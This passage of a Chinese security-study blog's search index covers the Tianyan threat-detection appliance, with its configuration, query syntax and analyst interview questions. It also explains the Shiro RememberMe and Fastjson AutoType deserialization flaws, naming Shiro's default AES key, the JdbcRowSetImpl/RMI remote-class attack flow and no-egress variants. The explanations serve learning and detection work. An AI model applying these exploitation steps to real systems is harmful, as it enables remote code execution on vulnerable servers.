alt="1719575431437"></p><p>规则配置</p><p>【规则配置】模块提供【网页漏洞利用】、【webshell上传】、【网络攻击】、【自定义规则】配置管理功能，支持查询、启停，自定义规则配置等操作。提供规则的规则编号、规则名称、威胁等级、规则分类、启用状态的筛选过滤，过滤查询字段之间可以进行组合查询。并支持单条规则启用、关闭以及对选中的规则进行批量启用、关闭的操作。同时提供了对每条规则详情的查看操作。</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575540837.png" alt="1719575540837"></p><p>【规则配置】一【自定义规则】分为两个模块，其中包含漏洞规则、威胁情报。</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575626255.png" alt="1719575626255"></p><p>自定义规则可进行导入导出</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575665906.png" alt="1719575665906"></p><p>威胁检测</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575759490.png" alt="1719575759490"></p><p>开启xff,可进行识别源ip</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575847085.png" alt="1719575847085"></p><p>弱口令可进行正则匹配</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575971162.png" alt="1719575971162"></p><p>流量记录</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576022092.png" alt="1719576022092"></p><p>文件还原（文件最大不能超过五十mb）</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576149467.png" alt="1719576149467"></p><p>抓包检测</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576238154.png" alt="1719576238154"></p><p>旁路阻断</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576328533.png" alt="1719576328533"></p><p>ssl解密，专门针对https</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576615040.png" alt="1719576615040"></p><p>白名单配置</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576718811.png" alt="1719576718811"></p><p>系统管理</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576780954.png" alt="1719576780954"></p><p>升级配置 （建议自动更新）</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576833922.png" alt="1719576833922"></p><p>数据传输数据</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577060799.png" alt="1719577060799"></p><p>snmp管理</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577099335.png" alt="1719577099335"></p><p>安全性配置</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577181717.png" alt="1719577181717"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577238499.png" alt="1719577238499"></p><p>敏感操作密码</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577312483.png" alt="1719577312483"></p><p>单点登录密匙</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577350110.png" alt="1719577350110"></p><p>账号管理</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577530241.png" alt="1719577530241"></p><p>操作审计</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577607883.png" alt="1719577607883"></p><h2 id="天眼分析平台"><a href="#天眼分析平台" class="headerlink" title="天眼分析平台"></a>天眼分析平台</h2><p>提供了一个全面的溯源分析能力，</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719578578628.png" alt="1719578578628"></p><p>存储日志分为三种</p><p>告警日志</p><p>来自探针（记录双向完整绘画，例如不存在恶意攻击流量则不会保留流量，而是记录流量的关键信息（http请求的状态码），形成网络日志存储）和沙箱的告警</p><p>网络日志</p><p>终端日志</p><p>存储天眼的终端日志，记录了mac地址，dns信息，进程端口信息</p><p>和传感器的区别</p><p>传感器同时也能存储报警日志，但是传感器的磁盘空间没有分析平台大，当流量攻击日志达到特定的值，旧的日志会进行覆盖</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719579604567.png" alt="1719579604567"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719579640598.png" alt="1719579640598"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719579674412.png" alt="1719579674412"></p><h2 id="文件威胁鉴定器"><a href="#文件威胁鉴定器" class="headerlink" title="文件威胁鉴定器"></a>文件威胁鉴定器</h2><p>传感器将文件日志传入文件威胁鉴定器，经过静态检测，动态检测，行为分析</p><h2 id="常见协议字段和语法"><a href="#常见协议字段和语法" class="headerlink" title="常见协议字段和语法"></a>常见协议字段和语法</h2><p>分析中心搜索</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719583038900.png" alt="1719583038900"></p><p>搜索语法：字段名称，项以及运算符</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719583242628.png" alt="1719583242628"></p><p>可使用通配符查询(?)，范围查询（to）,使用\进行转义</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719583335797.png" alt="1719583335797"> </p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719585560611.png" alt="1719585560611"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719585987177.png" alt="1719585987177"></p><h2 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h2><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719586218601.png" alt="1719586218601"></p><p>tcp分成七块</p><p>数据分片 发送端进行分片，在接收端进行重组 、由tcp确认分片的大小，控制分片进行重组</p><p>到达确认 就是接收端接收到了这个分片的数据的时候，然后根据片的数据的这个序号，去向发送端去确认发一个确认请求</p><p>超时重发</p><p>就是发送方如果说在发送分片的时候，启动了这个超时的这个定时器，没有收到相应的确认</p><p>滑动窗口 TCP接收缓空间的这个大小都是固定的，接收端只允许另一端去发送过来的缓冲区所能接受的数据</p><p>时序处理 传输过程中，丢失了顺序，将分片重新进行排序，以正确的数据提交给这个应用层</p><p>重复处理 数据分片可能会发送重复，tcp丢掉重复的数据</p><p>数据校验 检测端到端数据有没有发生变化</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587085756.png" alt="1719587085756"></p><h2 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h2><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587075133.png" alt="1719587075133"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587157361.png" alt="1719587157361"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587190182.png" alt="1719587190182"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587252832.png" alt="1719587252832"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587272730.png" alt="1719587272730"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587359939.png" alt="1719587359939"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587443598.png" alt="1719587443598"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587469776.png" alt="1719587469776"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587513796.png" alt="1719587513796"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587856375.png" alt="1719587856375"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587889261.png" alt="1719587875906"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587907454.png" alt="1719587907454"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587919911.png" alt="1719587919911"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587935193.png" alt="1719587935193"></p><h2 id="常见面试题目"><a href="#常见面试题目" class="headerlink" title="常见面试题目"></a>常见面试题目</h2><p>1.在天眼分析平台网络协议中sip、dip、sport、dport字段表示的含义是什么？<br>sip 源IP、dip 目的IP、sport 源端口、dport 目的端口</p><p>2.在天眼分析平台DNS协议中dns type字段表示的含义是?<br>dns type表示DNS请求类型 0代表DNS请求，1代表DNS响应</p><p>3.dns_type中addr代表什么？<br>表示该host对应的IP地址信息；可能有多个记录</p><p>4.天眼可以捕捉到cmd命令嘛？<br>可以捕捉到远程执行的，比如攻击者远控你内网机器，执行cmd并返回结果</p><p>5.天眼告警可以显示的结果，除了成功和失败还有什么嘛？<br>成功、失败、尝试、未知</p><p>未知：一般是告警生成错误了，可以忽略</p><p>尝试：是可能成功也可能失败， 需要全部分析</p><p>6.内网横向有哪些告警类型？<br>cs相关告警、隧道类告警、内网段的漏洞扫描、暴力破解</p><p>内网主机对内部其他主机的攻击行为，该主机可能被黑客控制沦为跳板机，企图控制更多的内网其他主机</p><p>7.使用天眼，如何判断资产是否失陷？<br>受害资产不断外联恶意地址，受害资产有shell连接或者隧道类的告警</p><p>8.出现受害ip为源的时候是什么情况?<br>当网络攻击者使用IP欺骗或伪造技术时，可能会发生受害IP为源的情况</p><p>9.在天眼分析中，威胁告警检索字段中 attack sip 字段表示的含义是什么?<br>攻击者IP</p><p>10.在天眼分析平台中,proto字段表示的含义是? 举两个邮件应用协议的例子<br>proto表示协议，邮件应用协议有ETP POPIMAP</p><p>11.在天眼分析平台中，IOC代表什么含义、反映？<br>IOC表示匹配成功的威胁情报</p><p>IOC反映主机或网络失陷特征信息，包括入侵工具、恶意软件和攻击者的属性</p><p>12.天眼中搜索一个日志里指定的端口？想把两个端口连接在一起查询？<br>sport eq 80</p><p>sport eq 80 or sport eq 443</p><p>13.一个告警的目的ip是114.114.114，端口是53，这样的告警，我应该对他的ip和端口进行封禁吗?<br>不能封禁，明显是dns服务器转发的地址和端口，需要进一步确认真实受害资产的ip信息</p><p>14.在天眼分析平台中，如何搜索源IP为A，目的IP为B的网络日志?运算符(AND)是大写还是小写?<br>ip(A) AND dip(B)</p><p>运算符需要大写</p><p>15.在天眼分析平台中，运算符都有哪些？<br>AND OR NOT</p><p>16.天眼分析平台中，发件人的字段是什么？<br>from</p><p>17.天眼分析平台模糊搜索，应该怎么写查询语句?<br>直接在日志检索模块去搜索你要输入的关键字</p><p>使用*加部分名称进行检索</p><p>18.GEO字段代表什么？<br>代表ip对应的地理位置</p><p>19.不出网的主机通过哪种代理方式建立连接？<br>正向代理</p><p>20天眼能捕捉到0day吗？<br>可以，需要通过日志去分析挖掘</p><p>21.天眼里的小工具用过吗？<br>用过，可以做一些常见编码的解码等，比如base64解码、url解码</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 安全设备 </tag>
+            
+            <tag> 天眼 </tag>
+            
+            <tag> TCP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>shiro漏洞及原理</title>
+      <link href="/2024/06/22/shiro%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%8E%9F%E7%90%86/"/>
+      <url>/2024/06/22/shiro%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%8E%9F%E7%90%86/</url>
+      
+        <content type="html"><![CDATA[<p>shiro漏洞及原理</p><p>shiro是什么</p><p><strong>Apache Shiro</strong>框架是一个功能强大且易于使用的 Java 安全框架，它执行身份验证、授权、加密和会话管理。借助 Shiro 易于理解的 API，您可以快速轻松地保护任何应用程序——从最小的移动应用程序到最大的 Web 和企业应用程序。</p><p>shiro的漏洞原理</p><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会将用户信息加密，加密过程:用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的rememberMe字段里面，在服务端收到请求对rememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本&lt;&#x3D;1.2.4中使用了默认密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，这就更容易触发RCE漏洞。<br>所以我们Payload产生的过程：<br>命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值</p><p><strong>漏洞验证</strong><br>未登录的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段<br>登录失败的话，不管有没有勾选RememberMe字段，返回包都会有 rememberMe&#x3D; deleteMe 字段<br>不勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe&#x3D;deleteMe字段。但是之后的所有请求中Cookie都不会有RememberMe字段<br>勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe&#x3D;deleteMe字段，还会有remember 字段，之后的所有请求中Cookie都会有rememberMe字段<br>或者可以在cookie后面自己加一个rememberMe&#x3D;1,看返回包有没有rememberMe&#x3D; deleteMe</p><p><strong>shrio550和721的区别</strong><br>主要区别在于Shiro550使用已知默认密码，只要有足够的密码，不需要Remember Cookie的<br>Shiro721的ase加密的key为系统随机生成，需要利用登录后的rememberMe去爆破正确的key值。<br>利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，再去构造反序列化攻击。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 框架漏洞 </tag>
+            
+            <tag> shiro </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Fastjson的原理</title>
+      <link href="/2024/06/22/2024-06-22-Fastjson%E7%9A%84%E5%8E%9F%E7%90%86/"/>
+      <url>/2024/06/22/2024-06-22-Fastjson%E7%9A%84%E5%8E%9F%E7%90%86/</url>
+      
+        <content type="html"><![CDATA[<p>是什么</p><p>json：Json是一种轻量级的数据交换格式，应该在一个程序员的开发生涯中是常接触的。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​        &quot;name&quot;:&quot;BossFrank&quot;,</span><br><span class="line"></span><br><span class="line">​        &quot;age&quot;:23,</span><br><span class="line"></span><br><span class="line">​        &quot;media&quot;:[&quot;CSDN&quot;,&quot;bilibili&quot;,&quot;Github&quot;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Fastjson：是一个Java库，可用于将Java对象转换为其JSON表示。它还可用于将JSON字符串转换为等效的Java对象。<strong>Fastjson可以处理任意Java对象，包括您没有源代码的预先存在的对象</strong>。</p><p>Fastjson漏洞的形成</p><p><strong>fastjson的漏洞本质还是一个java的<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">反序列化漏洞</a>，由于引进了AutoType功能，fastjson在对json字符串反序列化的时候，会读取到@type的内容，将json内容反序列化为java对象并调用这个类的setter方法。</strong></p><p><strong>fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制</strong></p><p>对于JSON框架来说，想要把一个Java对象转换成字符串有两种方法</p><p>1.基于setter&#x2F;getter</p><p>2.基于属性（AutoType）</p><p>基于setter&#x2F;getter</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Apple implements Fruit &#123;</span><br><span class="line">    private Big_Decimal price;</span><br><span class="line">    //省略 setter/getter、toString等</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class iphone implements Fruit &#123;</span><br><span class="line">    private Big_Decimal price;</span><br><span class="line">    //省略 setter/getter、toString等</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当一个类只有一个接口的时候，将这个类的对象序列化的时候，就会将子类抹去，只保留接口的类型，最后导致反序列化时无法得到原始类型。本例中，将两个json再反序列化生成java对象的时候，无法区分原始类是否是别的子类。</p><p>基于AutoType</p><p>为了解决上述问题： fastjson引入了基于属性（AutoType），即在序列化的时候，先把原始类型记录下来<br>{ “fruit”:{ “@type”:”com.hollis.lab.fastjson.test.Apple”, “price”:0.5 } }</p><p>引入AutoType后，iphone类对象序列化为json格式后为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; &quot;fruit&quot;:&#123; &quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.iphone&quot;, &quot;price&quot;:5000 &#125; &#125;</span><br></pre></td></tr></table></figure><p>漏洞原理</p><p>使用AutoType功能进行序列号的JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的setter或者getter方法，然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。</p><p>漏洞利用流程</p><p>攻击者（我们）访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，以json格式添加com.sun.rowset.JdbcRowSetImpl恶意类信息发送给目标机。<br>存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问rmi服务器)，靶机服务器就会向rmi服务器请求待执行的命令。也就是靶机服务器问rmi服务器，（靶机服务器）需要执行什么命令啊？<br>rmi 服务器请求加载远程机器的class（这个远程机器是我们搭建好的恶意站点，提前将漏洞利用的代码编译得到.class文件，并上传至恶意站点），得到攻击者（我们）构造好的命令（ping dnslog或者创建文件或者反弹shell啥的）rmi将远程加载得到的class（恶意代码），作为响应返回给靶机服务器。<br>靶机服务器执行了恶意代码，被攻击者成功利用。<br><img src="/2024/06/22/2024-06-22-Fastjson%E7%9A%84%E5%8E%9F%E7%90%86/Users\31055\Desktop\fastjosn\1719025936008.png" alt="1719025936008"></p><p>拓展：</p><p>fastjson不出网怎么利用</p><p>apache-BCEL，直接传入字节码不需要出网就可执行恶意代码但是需要引入tomcat的依赖，但在实际攻击中还算是比较常见的。</p><p>fastjson不出网利用<br>fastjson≤1.2.24</p><p>条件:BasicDataSource只需要有dbcp或tomcat-dbcp的依赖即可，dbcp即数据库连接池，在java中用于管理数据库连接，还是挺常见的。</p><p>参考链接：</p><p><a href="https://blog.csdn.net/Bossfrank?type=blog">Boss_frank-CSDN博客</a></p><p>[fastjson反序列化漏洞演示加详细讲解加原理_哔哩哔哩_bilibili</p><p><a href="https://blog.csdn.net/weixin_49248030/article/details/127989449">fastjson-BCEL不出网打法原理分析_fastjson不出网是什么-CSDN博客</a>](<a href="https://www.bilibili.com/video/BV1Ab4y1d7w1/?vd_source=e52c0be348f431bd52ecb6f73987ebbd">https://www.bilibili.com/video/BV1Ab4y1d7w1/?vd_source=e52c0be348f431bd52ecb6f73987ebbd</a>)</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 框架漏洞 </tag>
+            
+            <tag> fastjson </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>一个网站的测试思路</title>
+      <link href="/2024/06/16/2024-06-16-%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/"/>
+      <url>/2024/06/16/2024-06-16-%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/</url>
+      
+        <content type="html"><![CDATA[<p>一、未授权访问</p><p>findsometing 提取接口，如果对js比较熟悉，可以在js里搜索接口</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 思路技巧 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>记一次cnvd渗透</title>
+      <link href="/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/"/>
+      <url>/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/</url>
+      
